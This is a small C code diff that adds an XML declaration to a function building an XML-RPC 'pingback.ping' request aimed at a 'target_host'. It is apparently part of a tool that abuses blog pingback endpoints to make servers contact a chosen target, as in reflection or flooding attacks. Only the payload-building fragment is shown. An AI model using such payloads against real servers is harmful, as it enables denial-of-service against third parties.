@@ -9,6 +9,7 @@ char* xml_create_payload(const char* target_host, char* xml_host) {
 
   snprintf(xml_buf,
     sizeof(xml_buf),
+	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
     "<methodCall><methodName>pingback.ping</methodName>"
     "<params><param><value><string>%s</string></value></param>"
     "<param><value><string>http://%s/?p=1</string></value></param>"
